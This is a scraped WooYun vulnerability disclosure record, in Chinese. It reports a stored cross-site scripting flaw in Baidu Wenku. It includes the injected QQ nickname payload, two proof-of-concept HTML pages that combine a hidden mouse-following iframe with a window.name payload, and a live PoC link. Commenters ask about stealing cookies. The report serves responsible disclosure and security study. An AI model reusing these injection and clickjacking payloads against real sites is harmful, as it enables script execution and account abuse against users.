{"id": 46144, "wybug_id": "wooyun-2015-092465", "wybug_title": "百度文库存储型XSS(指哪补哪留祸患)", "wybug_corp": "百度", "wybug_author": "超威蓝猫", "wybug_date": "2015-01-17 22:03", "wybug_open_date": "2015-03-03 22:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-03：\t细节向公众公开  简要描述： 指哪补哪，100天过去了，漏洞的源头还没堵上。 详细说明：  注册一个新的QQ，将昵称修改为如下代码后，使用该QQ通过OAuth接口登录百度文库。\n\"onclick=eval(window.name)//\n在任意公开的文档下面回复后：\n\n参考http://wooyun.org/bugs/wooyun-2015-089971中提到的M神 @mramydnei 的代码构造如下poc来实现\"在页面任意处点击来执行恶意JS\":P.S: 第一次打开这个PoC可能由于坐标计算问题无法触发XSS，重新打开一次即可。如果多次打开都无法触发XSS，那可能是由于坐标计算错误。1.html\n<style>html, body {  cursor: pointer;}#box, #box > * {  position: absolute;  width: 100px;  height: 400px;  border: 1px solid red;  opacity: 0;}#victim {  border: none;}</style><div id=\"box\">  <iframe id=\"victim\" src=\"2.html\" scrolling=\"no\"></iframe></div><script src=\"http://s1.bdstatic.com/r/www/cache/static/jquery/jquery-1.10.2.min.js\"></script><script>$(document).mousemove(function(e) {  var x = e.pageX;  var y = e.pageY;  $('#box').css({left: x - 50, top: y - 280});});</script>\n2.html:\n<style>html, body {  width: 5000px;  height: 5000px;}</style><iframe width=\"800\" height=\"500\" src=\"http://wenku.baidu.com/view/7e384bc22cc58bd63186bd5c.html#ft\" name=\"alert(location);this.href='file:///'\">\n感谢长短短 @Sogili 指点，这里使用了 this.href='file:///' 来避免a标签的href被打开(IE/Chrome均测试通过)。   漏洞证明：  PoC: http://218.66.75.117:8080/baidu0117_1.html   修复方案：  新年礼物 ._.   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-01-19 11:26 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-17 22:29 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1301 漏洞数:373        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  能钓cookie不    \n     2015-01-17 22:35 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:116        | STEAM_0:0:55968383)\t\t \n  @0x 80 能，但关键的BDUSS受http-only保护    \n     2015-01-17 22:35 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:16        | 谁送我HHKB,我就嫁给她！)\t\t \n  前排~    \n     2015-01-17 22:39 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:78        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  没修复完整的错    \n     2015-01-17 22:44 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1301 漏洞数:373        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  @超威蓝猫 那还是不错了。！顶，你也知道现在网络限制的东西多得很    \n     2015-01-18 00:59 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:25        | 不会挖洞洞的猿猿不是好学生)\t\t \n  蓝猫一上线就发大财    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}